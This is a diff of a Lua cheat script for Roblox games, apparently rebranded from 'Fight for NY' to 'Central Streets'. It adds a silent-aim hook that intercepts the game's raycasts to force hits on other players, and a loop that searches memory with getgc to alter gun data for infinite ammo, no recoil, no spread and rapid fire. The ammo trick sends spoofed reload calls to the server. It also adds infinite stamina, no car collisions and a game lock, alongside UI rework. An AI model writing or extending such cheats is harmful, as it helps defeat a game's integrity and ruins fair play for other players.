+                                local targetPart = GET_TARGET_PART(char, _G.EXE.SILENT_AIM.Hitbox)
+                                if VISIBLE_CHECK(targetPart) then
+                                    closestTarget = p
+                                    maxDist = dist
+                                end
+                            else
+                                closestTarget = p
+                                maxDist = dist
+                            end
                         end
-                    end)
-                end
-                origin = origin or Camera.CFrame.Position
-
-                local newDir = (part.Position - origin).Unit
-                for i = 1, #directions do
-                    directions[i] = newDir
+                    end
                 end
             end
         end
-
-        return originalSimulate(self, gun, handle, settings, directions, firePoint, muzzle, vfx, visualize)
     end
-else
-    warn("[SilentAim] No se pudo requerir ProjectileHandler. El juego podría no estar usándolo.")
+
+    return closestTarget
 end
---]]
+
+-- [ SILENT AIM / RAYCAST HOOKING ]
+local OldNamecall
+OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
+    local method = getnamecallmethod()
+
+    if method == "Raycast" and Self == workspace and _G.EXE and _G.EXE.SILENT_AIM and _G.EXE.SILENT_AIM.Enabled then
+        local origin = select(1, ...)
+        local oldDirection = select(2, ...)
+
+        if typeof(origin) == "Vector3" and typeof(oldDirection) == "Vector3" then
+            local target = GET_SILENT_TARGET()
+            if target then
+                local targetChar = GET_CHAR(target)
+                local targetPart = GET_TARGET_PART(targetChar, _G.EXE.SILENT_AIM.Hitbox)
+
+                if targetPart then
+                    -- FastCast compatibility: Instead of bending the micro-ray, we cast a guaranteed hit on the target.
+                    local params = select(3, ...)
+                    local spoofOrigin = targetPart.Position + Vector3.new(0, 5, 0)
+                    local spoofDirection = Vector3.new(0, -10, 0)
+
+                    -- Avoid infinite recursion by bypassing namecall
+                    local fakeHit = workspace.Raycast(workspace, spoofOrigin, spoofDirection, params)
+
+                    if fakeHit and fakeHit.Instance:IsDescendantOf(targetChar) then
+                        if setnamecallmethod then setnamecallmethod("Raycast") end
+                        return fakeHit
+                    end
+
+                    -- Fallback if fake hit fails, just bend the ray as a last resort
+                    local newDirection = (targetPart.Position - origin).Unit * oldDirection.Magnitude
+                    if setnamecallmethod then setnamecallmethod("Raycast") end
+                    return OldNamecall(Self, origin, newDirection, params)
+                end
+            end
+
+            -- Restore method if GET_SILENT_TARGET() changed it and no target was found
+            if setnamecallmethod then setnamecallmethod("Raycast") end
+        end
+    end
+
+    return OldNamecall(Self, ...)
+end)
+
+
+
+
+-- [ PREVIOUS MODULE HOOKING REMOVED IN FAVOR OF DIRECT RAYCAST INTERCEPTION ]
+
+
+-- [ FOV CIRCLE VISUALS ]
+local FOV_CIRCLE = Drawing.new("Circle")
+FOV_CIRCLE.Visible = false
+FOV_CIRCLE.Thickness = 1
+FOV_CIRCLE.Color = Color3.fromRGB(255, 255, 255)
+FOV_CIRCLE.Filled = false
+FOV_CIRCLE.Transparency = 1
+
+local RunService = game:GetService("RunService")
+RunService.RenderStepped:Connect(function()
+    if _G.EXE and _G.EXE.SILENT_AIM and _G.EXE.SILENT_AIM.Enabled and _G.EXE.SILENT_AIM.ShowFOV then
+        local ms = UIS:GetMouseLocation()
+        FOV_CIRCLE.Position = Vector2.new(ms.X, ms.Y)
+        FOV_CIRCLE.Radius = _G.EXE.SILENT_AIM.FOV_Radius or 100
+        FOV_CIRCLE.Visible = true
+    else
+        FOV_CIRCLE.Visible = false
+    end
+end)
 
 -- [ WORLD VISUALS ]
 -- Logic handled via UI Toggles directly
@@ -2540,12 +2722,13 @@ SCR.Name = "CEN_V2"
 SCR.ResetOnSpawn = false
 SCR.DisplayOrder = 5000
 SCR.IgnoreGuiInset = true
+SCR.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 -- Kill Switch Connection: Shutdown all active features when UI is destroyed
 SCR.Destroying:Connect(function()
     if _G.EXE and _G.EXE.ACTIVE_TOGGLES then
         for _, tgl in ipairs(_G.EXE.ACTIVE_TOGGLES) do
-            if tgl.VAL then
+            if tgl.VAL and not tgl.IsSetting then
                 pcall(function() tgl:SET(false, true) end) -- Shutdown FORCED with callback running
             end
         end
@@ -2586,96 +2769,78 @@ local function BUILD_NYH_UI()
     repeat task.wait() until game.PlaceId ~= 0
     local curId = tostring(game.PlaceId)
     local ALLOWED = {
-        ["111492135141809"] = true,
-        ["132783130677780"] = true,
-        ["94321403883737"] = true, --94321403883737
-        ["74447750680790"] = true, -- fisrt person
-        ["87395899041403"] = true, --low graffics server
-        ["93332250202520"] = true  --voice chat server
+        ["121567535120062"] = true
     }
 
-    if curId == tostring(MAIN_ID) then
-        NOTIFY("SECURITY", "Please join the main game to use this script!", 15)
-        return
-    elseif not ALLOWED[curId] then
-        LPLR:Kick("Game Lock: Script locked. Please join game 111492135141809. (Current: " .. curId .. ")")
+    if not ALLOWED[curId] then
+        LPLR:Kick("Game Lock: Script locked. Please join game " .. TARGET_ID .. ". (Current: " .. curId .. ")")
         return
     end
 
     -- Progressive Loading: Show UI foundation immediately
     SCR.Parent = CORE
 
-    local SM_REF = game:GetService("ReplicatedStorage"):WaitForChild("StoreMenus", 10)
-    if not SM_REF then
-        warn("[NYH] StoreMenus not found, using fallback tables")
-        SM_REF = {
-            ["Ling Enterprises"] = { Ammo = {}, Misc = {}, Pistols = {}, SMGs = {} },
-            ["Ling Heavy"] = { Rifles = {} },
-            Deli = { Consumables = {}, Misc = {} },
-            ["Issac's Stock"] = { Attachments = { Beam = {}, Switch = {} }, Misc = {} }
-        }
-    end
 
     -- [ TOGGLE HELPER ]
     local function ADD_TOG(PAG, TXT, DEF, CB, SM)
-        local TGL = { VAL = DEF or false, CB = CB }
+        local TGL = { VAL = DEF or false, CB = CB, IsSetting = SM }
         table.insert(_G.EXE.ACTIVE_TOGGLES, TGL)
 
         local ROW = Instance.new("Frame", PAG)
-        ROW.Size = UDim2.new(1, -10, 0, SM and 26 or 36)
+        ROW.Size = UDim2.new(1, -10, 0, 36)
         ROW.BackgroundTransparency = 1
         ROW.ZIndex = 8
 
         local LBL = Instance.new("TextLabel", ROW)
-        LBL.Size = UDim2.new(1, SM and -50 or -60, 1, 0)
+        LBL.Size = UDim2.new(1, -60, 1, 0)
         LBL.Position = UDim2.new(0, 0, 0, 0)
         LBL.BackgroundTransparency = 1
         LBL.Text = TXT
         LBL.TextColor3 = CFG.COL.TXT
         LBL.Font = Enum.Font.Gotham
-        LBL.TextSize = SM and 11 or 13
+        LBL.TextSize = 13
         LBL.TextXAlignment = Enum.TextXAlignment.Left
         LBL.ZIndex = 9
 
         -- Track pill
-        local PILL = Instance.new("Frame", ROW)
-        PILL.Size = UDim2.new(0, SM and 34 or 44, 0, SM and 18 or 24)
-        PILL.Position = UDim2.new(1, SM and -34 or -44, 0.5, SM and -9 or -12)
+        local PILL = Instance.new("TextButton", ROW)
+        PILL.Size = UDim2.new(0, 32, 0, 16)
+        PILL.Position = UDim2.new(1, -38, 0.5, -8)
         PILL.BackgroundColor3 = TGL.VAL and CFG.COL.ACC or CFG.COL.GRY
         PILL.BorderSizePixel = 0
+        PILL.Text = ""
+        PILL.AutoButtonColor = false
         PILL.ZIndex = 9
-        RND(PILL, SM and 9 or 12)
+        RND(PILL, 12)
+
+        local PILL_STR = Instance.new("UIStroke", PILL)
+        PILL_STR.Color = Color3.new(0, 0, 0)
+        PILL_STR.Transparency = 0.3
+        PILL_STR.Thickness = 1
 
         -- Knob
         local KNOB = Instance.new("Frame", PILL)
-        KNOB.Size = UDim2.new(0, SM and 14 or 18, 0, SM and 14 or 18)
-        KNOB.Position = TGL.VAL and UDim2.new(0, SM and 17 or 23, 0.5, SM and -7 or -9) or
-            UDim2.new(0, 3, 0.5, SM and -7 or -9)
+        KNOB.Size = UDim2.new(0, 12, 0, 12)
+        KNOB.Position = TGL.VAL and UDim2.new(0, 18, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)
         KNOB.BackgroundColor3 = Color3.new(1, 1, 1)
         KNOB.BackgroundTransparency = 0
         KNOB.BorderSizePixel = 0
         KNOB.ZIndex = 10
-        RND(KNOB, SM and 7 or 9)
+        RND(KNOB, 9)
 
         local function UPD(dont_callback)
             local T = CFG.SPD or 0.2
             if TGL.VAL then
                 TWN(PILL, { BackgroundColor3 = CFG.COL.ACC }, T)
-                TWN(KNOB, { Position = UDim2.new(0, SM and 17 or 23, 0.5, SM and -7 or -9) }, T)
+                TWN(KNOB, { Position = UDim2.new(0, 18, 0.5, -6) }, T)
             else
                 TWN(PILL, { BackgroundColor3 = CFG.COL.GRY }, T)
-                TWN(KNOB, { Position = UDim2.new(0, 3, 0.5, SM and -7 or -9) }, T)
+                TWN(KNOB, { Position = UDim2.new(0, 2, 0.5, -6) }, T)
             end
             if TGL.CB and not dont_callback then TGL.CB(TGL.VAL) end
         end
 
-        -- Click anywhere on the row
-        local CLK = Instance.new("TextButton", ROW)
-        CLK.Size = UDim2.new(1, 0, 1, 0)
-        CLK.BackgroundTransparency = 1
-        CLK.Text = ""
-        CLK.ZIndex = 5
-        CLK.MouseButton1Click:Connect(function()
+        PILL.MouseButton1Click:Connect(function()
             TGL.VAL = not TGL.VAL
             UPD()
         end)
@@ -2694,8 +2859,15 @@ local function BUILD_NYH_UI()
     -- [ MAIN WINDOW ]
     local MAIN = Instance.new("Frame", SCR)
     MAIN.Name = "WIN"
-    MAIN.Size = UDim2.new(0, 700, 0, 565)
-    MAIN.Position = UDim2.new(0.5, -350, 0.5, -282)
+    local safeSizeX = math.max(450, CurSizeX)
+    local safeSizeY = math.max(300, CurSizeY)
+    if UIS.TouchEnabled and not isfile("CTS_Config.json") then
+        local vp = workspace.CurrentCamera.ViewportSize
+        safeSizeX = math.max(450, vp.X * 0.6)
+        safeSizeY = math.max(300, vp.Y * 0.6)
+    end
+    MAIN.Size = UDim2.new(0, safeSizeX, 0, safeSizeY)
+    MAIN.Position = UDim2.new(0.5, -safeSizeX / 2, 0.5, -safeSizeY / 2)
     MAIN.BackgroundColor3 = CFG.COL.BG
     MAIN.BackgroundTransparency = 0.1
     MAIN.BorderSizePixel = 0
@@ -2739,7 +2911,7 @@ local function BUILD_NYH_UI()
     F_BRAND.Size = UDim2.new(1, 0, 1, 0)
     F_BRAND.Position = UDim2.new(0, 0, 0, 0)
     F_BRAND.BackgroundTransparency = 1
-    F_BRAND.Text = "fight for ny | WH01AM"
+    F_BRAND.Text = "Central Streets | WH01AM"
     F_BRAND.TextColor3 = Color3.fromRGB(80, 80, 95)
     F_BRAND.Font = Enum.Font.GothamMedium
     F_BRAND.TextSize = 10
@@ -2777,10 +2949,17 @@ local function BUILD_NYH_UI()
         local IS_TOUCH = I.UserInputType == Enum.UserInputType.Touch
         if DG_ON and (IS_MOUSE or (IS_TOUCH and I == DG_INP)) then
             local DEL = I.Position - DG_STR
-            MAIN.Position = UDim2.new(
+            local targetPos = UDim2.new(
                 DG_POS.X.Scale, DG_POS.X.Offset + DEL.X,
                 DG_POS.Y.Scale, DG_POS.Y.Offset + DEL.Y
             )
+            if CurSmoothDrag then
+                TS:Create(MAIN, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                    Position = targetPos
+                }):Play()
+            else
+                MAIN.Position = targetPos
+            end
         end
     end)
 
@@ -2836,7 +3015,7 @@ local function BUILD_NYH_UI()
         m.Size = UDim2.new(1, -60, 1, 0)
         m.Position = UDim2.new(0, 60, 0, 0)
         m.BackgroundTransparency = 1
-        m.Text = "  Fight for NY 💎"
+        m.Text = " Central Streets 🔫"
         m.TextColor3 = CFG.COL.TXT
         m.Font = Enum.Font.GothamBold
         m.TextSize = 13
@@ -2845,13 +3024,16 @@ local function BUILD_NYH_UI()
     end
 
     -- Weapon mods state — declared here so close handler can access it
-    local WM      = { INF_AMMO = false, NO_RECOIL = false, RAPID_FIRE = false }
-    local WM_RATE = 0.01
+    local WM               = { INF_AMMO = false, NO_RECOIL = false, RAPID_FIRE = false }
+    local WM_RATE          = 0.01
+    local infStaminaActive = false
+    local antiCarHitActive = false
+    local antiCarHitConn   = nil
 
     -- Movement state — declared here so close handler can access it
-    _G.EXE.FLY_ON = false
-    _G.EXE.SPD_ON = false
-    _G.EXE.JMP_ON = false
+    _G.EXE.FLY_ON          = false
+    _G.EXE.SPD_ON          = false
+    _G.EXE.JMP_ON          = false
 
     -- [ PANIC BUTTON / TOTAL BLACKOUT ]
     local function PANIC()
@@ -2930,6 +3112,12 @@ local function BUILD_NYH_UI()
             WM.NO_RECOIL  = false
             WM.RAPID_FIRE = false
         end
+        infStaminaActive = false
+        antiCarHitActive = false
+        if antiCarHitConn then
+            pcall(function() antiCarHitConn:Disconnect() end)
+            antiCarHitConn = nil
+        end
         if _G.EXE.GUN_MODS then
             for k, _ in pairs(_G.EXE.GUN_MODS) do _G.EXE.GUN_MODS[k] = false end
         end
@@ -2952,9 +3140,158 @@ local function BUILD_NYH_UI()
         _G.CENTRAL_LOADED = false
     end
 
+    -- [ WEAPON MODS LOOP - OPTIMIZED ]
+    local CACHED_GUN_DATA = nil
+    local lastScan = 0
+    local shotsFired = 0
+    LPLR.CharacterAdded:Connect(function()
+        CACHED_GUN_DATA = nil; shotsFired = 0
+    end)
+
+    task.spawn(function()
+        while task.wait(0.1) do
+            if WM.INF_AMMO or WM.NO_RECOIL or WM.NO_SPREAD or WM.RAPID_FIRE then
+                pcall(function()
+                    local char = LPLR.Character
+                    local hasTool = char and char:FindFirstChildWhichIsA("Tool")
+
+                    -- ONLY process if player actually has a tool out
+                    if not hasTool then
+                        CACHED_GUN_DATA = nil
+                        shotsFired = 0
+                        return
+                    end
+
+                    -- Check if cache is still valid (must have _currentGunMetadata and _equippedGun)
+                    local valid = CACHED_GUN_DATA and type(CACHED_GUN_DATA) == "table"
+                        and rawget(CACHED_GUN_DATA, "_currentGunMetadata")
+                        and rawget(CACHED_GUN_DATA, "_equippedGun")
+
+                    if valid then
+                        local meta = CACHED_GUN_DATA._currentGunMetadata
+
+                        -- Infinite Ammo (Silent Reload Sync)
+                        if WM.INF_AMMO then
+                            local maxMag = meta.MagMax or 30
+                            local current = meta.InMag or maxMag
+                            if current < maxMag then
+                                local diff = maxMag - current
+                                shotsFired = shotsFired + diff
+                                meta.InMag = maxMag
+                            end
+                            if shotsFired >= 10 then
+                                shotsFired = 0
+                                local remotes = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
+                                local rel = remotes and remotes:FindFirstChild("ReloadComplete")
+                                if rel then
+                                    pcall(function()
+                                        local gunName = meta.Name or CACHED_GUN_DATA._equippedGun.Name
+                                        if gunName then
+                                            rel:FireServer(gunName)
+                                        end
+                                    end)
+                                end
+                            end
+                        end
+
+                        -- No Recoil
+                        if WM.NO_RECOIL and meta.Recoil and type(meta.Recoil) == "table" then
+                            meta.Recoil.Magnitude, meta.Recoil.Roughness, meta.Recoil.PositionInfluence = 0, 0, 0
+                        end
+
+                        -- No Spread
+                        if WM.NO_SPREAD then meta.BulletSpreadValue = 0 end
+
+                        -- Rapid Fire
+                        if WM.RAPID_FIRE then
+                            meta.FireMode, meta.FireRate = "Auto", 0.08
+                        end
+
+                        -- Jam Prevention
+                        if meta.JamChance then meta.JamChance = 0 end
+                    else
+                        -- Cache invalid, scan GC throttled
+                        local now = os.clock()
+                        if now - lastScan > 1.5 then
+                            lastScan = now
+                            for _, v in ipairs(getgc(true)) do
+                                if type(v) == "table" and rawget(v, "_currentGunMetadata") and rawget(v, "_equippedGun") then
+                                    CACHED_GUN_DATA = v
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+
+    -- [ INFINITE STAMINA LOOP ]
+    local CharacterMovement = nil
+    task.spawn(function()
+        while task.wait(0.3) do
+            if infStaminaActive then
+                pcall(function()
+                    if not CharacterMovement then
+                        local framework = game:GetService("ReplicatedStorage"):FindFirstChild("Framework")
+                        local client = framework and framework:FindFirstChild("Client")
+                        local charMov = client and client:FindFirstChild("CharacterMovement")
+                        if charMov then
+                            CharacterMovement = require(charMov)
+                        end
+                    end
+                    if CharacterMovement and CharacterMovement.Variables then
+                        CharacterMovement.Variables.SprintAmount = 200
+                    end
+                end)
+            end
+        end
+    end)
+
+    -- [ ANTI CAR HIT LOOP ]
+    local cachedCars = {}
+    task.spawn(function()
+        while task.wait(1) do
+            if not _G.CENTRAL_LOADED then break end
+            local newCache = {}
+            local carsFolder = workspace:FindFirstChild("Cars")
+            if carsFolder then
+                for _, car in ipairs(carsFolder:GetChildren()) do
+                    if car:IsA("Model") then
+                        table.insert(newCache, car)
+                    end
+                end
+            end
+            cachedCars = newCache
+        end
+    end)
+
+    antiCarHitConn = RS.Stepped:Connect(function()
+        if not _G.CENTRAL_LOADED then
+            if antiCarHitConn then antiCarHitConn:Disconnect() end
+            return
+        end
+        if antiCarHitActive then
+            local char = LPLR.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            local myCar = hum and hum.SeatPart and hum.SeatPart:FindFirstAncestorWhichIsA("Model")
+
+            for _, car in ipairs(cachedCars) do
+                if car.Parent and car ~= myCar then
+                    for _, part in ipairs(car:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                            part.CanTouch = false
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
     -- Close
     B_CLS.MouseButton1Click:Connect(function()
-        if not UIS.TouchEnabled then UIS.MouseIconEnabled = false end
         PANIC()
         SCR:Destroy()
     end)
@@ -2989,7 +3326,6 @@ local function BUILD_NYH_UI()
                 if b then b.Visible = false end
 
                 TWN(MAIN, { Size = UDim2.new(0, 220, 0, 40), BackgroundTransparency = 0.2 })
-                if not UIS.TouchEnabled then UIS.MouseIconEnabled = false end
                 task.wait(0.35)
                 local mTitle = BAR:FindFirstChild("MIN_TITLE")
                 if mTitle then
@@ -3009,7 +3345,6 @@ local function BUILD_NYH_UI()
                     mTitle.TextTransparency = 1
                 end
                 TWN(MAIN, { Size = OLD_SZ, BackgroundTransparency = 0.1 })
-                if not UIS.TouchEnabled then UIS.MouseIconEnabled = true end
                 task.wait(0.35)
                 if TCON then TCON.Visible = true end
                 if PCON then PCON.Visible = true end
@@ -3023,7 +3358,7 @@ local function BUILD_NYH_UI()
     end
 
     -- [ TAB BAR ]
-    local TCON = Instance.new("Frame", MAIN)
+    local TCON = Instance.new("ScrollingFrame", MAIN)
     TCON.Name = "TABS"
     TCON.Size = UDim2.new(1, -140, 0, 35)
     TCON.Position = UDim2.new(0.5, 0, 0, 10)
@@ -3031,14 +3366,20 @@ local function BUILD_NYH_UI()
     TCON.BackgroundColor3 = CFG.COL.BG
     TCON.BackgroundTransparency = 0.4
     TCON.ZIndex = 10
+    TCON.BorderSizePixel = 0
+    TCON.ScrollBarThickness = 0
+    TCON.CanvasSize = UDim2.new(0, 0, 0, 0)
+    TCON.AutomaticCanvasSize = Enum.AutomaticSize.X
+    TCON.ScrollingDirection = Enum.ScrollingDirection.X
+    TCON.ClipsDescendants = true
     RND(TCON, 20)
     STR(TCON, CFG.COL.ACC, 1).Transparency = 0.8
 
     local TLAY = Instance.new("UIListLayout", TCON)
     TLAY.FillDirection = Enum.FillDirection.Horizontal
-    TLAY.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    TLAY.HorizontalAlignment = Enum.HorizontalAlignment.Left
     TLAY.VerticalAlignment = Enum.VerticalAlignment.Center
-    TLAY.Padding = UDim.new(0.02, 0)
+    TLAY.Padding = UDim.new(0, 8)
 
     -- [ PAGE CONTAINER ]
     local PCON = Instance.new("Frame", MAIN)
@@ -3052,59 +3393,257 @@ local function BUILD_NYH_UI()
     local CUR_BTN = nil
     local CUR_PAG = nil
 
-    local function MK_TAB(TXT)
+    local function UPDATE_TAB_VISUALS(btn, isActive)
+        local isSidebar = CurSidebarTabs
+        local lbl1 = btn:FindFirstChild("TitleLabel")
+        local lbl2 = btn:FindFirstChild("DescLabel")
+        local ind = btn:FindFirstChild("Ind")
+        local bstroke = btn:FindFirstChild("BorderStroke")
+        local uicorner = btn:FindFirstChildWhichIsA("UICorner")
+
+        if isSidebar then
+            btn.Text = ""
+            if lbl1 then lbl1.Visible = true end
+            if lbl2 then lbl2.Visible = true end
+            if bstroke then bstroke.Enabled = true end
+            if uicorner then uicorner.CornerRadius = UDim.new(0, 4) end
+
+            if isActive then
+                if ind then ind.Visible = true end
+                TWN(btn, { BackgroundColor3 = Color3.fromRGB(24, 24, 24), BackgroundTransparency = 0.4 }, 0.15)
+                if bstroke then TWN(bstroke, { Transparency = 0 }, 0.15) end
+                if lbl1 then TWN(lbl1, { TextColor3 = Color3.fromRGB(255, 255, 255) }, 0.15) end
+            else
+                if ind then ind.Visible = false end
+                TWN(btn, { BackgroundTransparency = 1 }, 0.15)
+                if bstroke then TWN(bstroke, { Transparency = 1 }, 0.15) end
+                if lbl1 then TWN(lbl1, { TextColor3 = Color3.fromRGB(140, 140, 140) }, 0.15) end
+            end
+        else
+            btn.Text = btn:GetAttribute("TabName") or ""
+            if lbl1 then lbl1.Visible = false end
+            if lbl2 then lbl2.Visible = false end
+            if ind then ind.Visible = false end
+            if bstroke then bstroke.Enabled = false end
+            if uicorner then uicorner.CornerRadius = UDim.new(0, 12) end
+
+            if isActive then
+                TWN(btn, {
+                    TextColor3 = Color3.new(0, 0, 0),
+                    BackgroundTransparency = 0.4,
+                    BackgroundColor3 = CFG.COL.ACC
+                }, 0.15)
+            else
+                TWN(btn, {
+                    TextColor3 = CFG.COL.GRY,
+                    BackgroundTransparency = 1
+                }, 0.15)
+            end
+        end
+    end
+
+    REF_UPDATE_TABS = function()
+        for _, child in ipairs(TCON:GetChildren()) do
+            if child:IsA("TextButton") then
+                UPDATE_TAB_VISUALS(child, (CUR_BTN == child))
+            end
+        end
+    end
+
+    local function UPDATE_SIDEBAR_MODE(isOn)
+        local tconPadding = TCON:FindFirstChild("TCON_Padding")
+        if isOn then
+            MAIN.ClipsDescendants = false
+            TCON.ScrollingDirection = Enum.ScrollingDirection.Y
+            TCON.AutomaticCanvasSize = Enum.AutomaticSize.Y
+            TWN(TCON, {
+                Size = UDim2.new(0, 160, 1, 0),
+                Position = UDim2.new(0, -15, 0, 0),
+                BackgroundTransparency = 0,
+                BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+            })
+            TCON.AnchorPoint = Vector2.new(1, 0)
+            TLAY.FillDirection = Enum.FillDirection.Vertical
+            TLAY.Padding = UDim.new(0, 6)
+            TLAY.HorizontalAlignment = Enum.HorizontalAlignment.Center
+            TLAY.VerticalAlignment = Enum.VerticalAlignment.Top
+
+            local corner = TCON:FindFirstChildOfClass("UICorner")
+            if corner then corner.CornerRadius = UDim.new(0, 12) end
+
+            if not tconPadding then
+                tconPadding = Instance.new("UIPadding", TCON)
+                tconPadding.Name = "TCON_Padding"
+            end
+            tconPadding.PaddingTop = UDim.new(0, 12)
+            tconPadding.PaddingBottom = UDim.new(0, 12)
+            tconPadding.PaddingLeft = UDim.new(0, 8)
+            tconPadding.PaddingRight = UDim.new(0, 8)
+
+            TWN(PCON, { Size = UDim2.new(1, -20, 1, -85), Position = UDim2.new(0, 10, 0, 55) })
+
+            for _, child in ipairs(TCON:GetChildren()) do
+                if child:IsA("TextButton") then
+                    child.Size = UDim2.new(1, 0, 0, 46)
+                    local pad = child:FindFirstChild("UIPadding")
+                    if pad then pad:Destroy() end
+                    UPDATE_TAB_VISUALS(child, (CUR_BTN == child))
+                end
+            end
+        else
+            TCON.ScrollingDirection = Enum.ScrollingDirection.X
+            TCON.AutomaticCanvasSize = Enum.AutomaticSize.X
+            TWN(TCON, {
+                Size = UDim2.new(1, -140, 0, 35),
+                Position = UDim2.new(0.5, 0, 0, 10),
+                BackgroundTransparency = 0.4,
+                BackgroundColor3 = CFG.COL.BG
+            })
+            TCON.AnchorPoint = Vector2.new(0.5, 0)
+            TLAY.FillDirection = Enum.FillDirection.Horizontal
+            TLAY.Padding = UDim.new(0, 8)
+            TLAY.HorizontalAlignment = Enum.HorizontalAlignment.Left
+            TLAY.VerticalAlignment = Enum.VerticalAlignment.Center
+
+            local corner = TCON:FindFirstChildOfClass("UICorner")
+            if corner then corner.CornerRadius = UDim.new(0, 20) end
+
+            if not tconPadding then
+                tconPadding = Instance.new("UIPadding", TCON)
+                tconPadding.Name = "TCON_Padding"
+            end
+            tconPadding.PaddingTop = UDim.new(0, 0)
+            tconPadding.PaddingBottom = UDim.new(0, 0)
+            tconPadding.PaddingLeft = UDim.new(0, 10)
+            tconPadding.PaddingRight = UDim.new(0, 10)
+
+            TWN(PCON, { Size = UDim2.new(1, -20, 1, -85), Position = UDim2.new(0, 10, 0, 55) })
+
+            for _, child in ipairs(TCON:GetChildren()) do
+                if child:IsA("TextButton") then
+                    child.Size = UDim2.new(0.166, -11, 0.8, 0)
+                    local pad = child:FindFirstChild("UIPadding")
+                    if pad then pad:Destroy() end
+                    UPDATE_TAB_VISUALS(child, (CUR_BTN == child))
+                end
+            end
+            task.delay(0.3, function()
+                if not CurSidebarTabs then
+                    MAIN.ClipsDescendants = true
+                end
+            end)
+        end
+    end
+
+    local function MK_TAB(TXT, SUB)
         local BTN = Instance.new("TextButton", TCON)
-        BTN.Size = UDim2.new(0.18, 0, 0.8, 0)
+        BTN.Size = UDim2.new(0.166, -11, 0.8, 0)
         BTN.BackgroundTransparency = 1
         BTN.Text = TXT
         BTN.TextColor3 = CFG.COL.GRY
         BTN.Font = Enum.Font.GothamBold
         BTN.TextScaled = true
         BTN.TextWrapped = true
+        BTN.AutoButtonColor = false
+        BTN:SetAttribute("TabName", TXT)
+        BTN.ZIndex = 11
         RND(BTN, 12)
 
-        local TSC                  = Instance.new("UITextSizeConstraint", BTN)
-        TSC.MaxTextSize            = 12
-        TSC.MinTextSize            = 8
+        local TSC                   = Instance.new("UITextSizeConstraint", BTN)
+        TSC.MaxTextSize             = 12
+        TSC.MinTextSize             = 8
 
-        local PAG                  = Instance.new("ScrollingFrame", PCON)
-        PAG.Size                   = UDim2.new(1, 0, 1, 0)
-        PAG.BackgroundTransparency = 1
-        PAG.BorderSizePixel        = 0
-        PAG.Visible                = false
-        PAG.ScrollBarThickness     = 2
-        PAG.ScrollBarImageColor3   = CFG.COL.ACC
-        PAG.AutomaticCanvasSize    = Enum.AutomaticSize.Y
+        local bstroke               = Instance.new("UIStroke", BTN)
+        bstroke.Name                = "BorderStroke"
+        bstroke.Color               = Color3.fromRGB(45, 45, 45)
+        bstroke.Thickness           = 1
+        bstroke.Transparency        = 1
+        bstroke.Enabled             = false
 
-        local LST                  = Instance.new("UIListLayout", PAG)
-        LST.Padding                = UDim.new(0, 8)
-        LST.HorizontalAlignment    = Enum.HorizontalAlignment.Center
-        LST.SortOrder              = Enum.SortOrder.LayoutOrder
+        local lbl1                  = Instance.new("TextLabel", BTN)
+        lbl1.Name                   = "TitleLabel"
+        lbl1.Size                   = UDim2.new(1, -30, 0, 20)
+        lbl1.Position               = UDim2.new(0, 16, 0, 6)
+        lbl1.BackgroundTransparency = 1
+        lbl1.Text                   = TXT
+        lbl1.TextColor3             = Color3.fromRGB(140, 140, 140)
+        lbl1.Font                   = Enum.Font.GothamBold
+        lbl1.TextSize               = 13
+        lbl1.TextXAlignment         = Enum.TextXAlignment.Left
+        lbl1.Visible                = false
+        lbl1.ZIndex                 = 12
 
-        local PAD                  = Instance.new("UIPadding", PAG)
-        PAD.PaddingTop             = UDim.new(0, 5)
-        PAD.PaddingLeft            = UDim.new(0, 5)
-        PAD.PaddingRight           = UDim.new(0, 5)
-        PAD.PaddingBottom          = UDim.new(0, 20) -- Espacio extra al final de la lista
+        local lbl2                  = Instance.new("TextLabel", BTN)
+        lbl2.Name                   = "DescLabel"
+        lbl2.Size                   = UDim2.new(1, -30, 0, 14)
+        lbl2.Position               = UDim2.new(0, 16, 0, 24)
+        lbl2.BackgroundTransparency = 1
+        lbl2.Text                   = SUB or ""
+        lbl2.TextColor3             = Color3.fromRGB(90, 90, 90)
+        lbl2.Font                   = Enum.Font.Gotham
+        lbl2.TextSize               = 10
+        lbl2.TextXAlignment         = Enum.TextXAlignment.Left
+        lbl2.Visible                = false
+        lbl2.ZIndex                 = 12
+
+        local ind                   = Instance.new("Frame", BTN)
+        ind.Name                    = "Ind"
+        ind.Size                    = UDim2.new(0, 3, 0, 22)
+        ind.Position                = UDim2.new(1, -3, 0.5, -11)
+        ind.BackgroundColor3        = CFG.COL.ACC
+        ind.BorderSizePixel         = 0
+        ind.Visible                 = false
+        ind.ZIndex                  = 12
+
+        local PAG                   = Instance.new("ScrollingFrame", PCON)
+        PAG.Size                    = UDim2.new(1, 0, 1, 0)
+        PAG.BackgroundTransparency  = 1
+        PAG.BorderSizePixel         = 0
+        PAG.Visible                 = false
+        PAG.ScrollBarThickness      = 2
+        PAG.ScrollBarImageColor3    = CFG.COL.ACC
+        PAG.AutomaticCanvasSize     = Enum.AutomaticSize.Y
+        PAG.ZIndex                  = 6
+
+        local LST                   = Instance.new("UIListLayout", PAG)
+        LST.Padding                 = UDim.new(0, 8)
+        LST.HorizontalAlignment     = Enum.HorizontalAlignment.Center
+        LST.SortOrder               = Enum.SortOrder.LayoutOrder
+
+        local PAD                   = Instance.new("UIPadding", PAG)
+        PAD.PaddingTop              = UDim.new(0, 5)
+        PAD.PaddingLeft             = UDim.new(0, 5)
+        PAD.PaddingRight            = UDim.new(0, 5)
+        PAD.PaddingBottom           = UDim.new(0, 20)
+
+        BTN.MouseEnter:Connect(function()
+            if CurSidebarTabs and CUR_BTN ~= BTN then
+                TWN(lbl1, { TextColor3 = Color3.fromRGB(200, 200, 200) }, 0.12)
+            end
+        end)
+
+        BTN.MouseLeave:Connect(function()
+            if CurSidebarTabs and CUR_BTN ~= BTN then
+                TWN(lbl1, { TextColor3 = Color3.fromRGB(140, 140, 140) }, 0.12)
+            end
+        end)
 
         BTN.MouseButton1Click:Connect(function()
             if CUR_BTN == BTN then return end
 
-            if CUR_BTN then
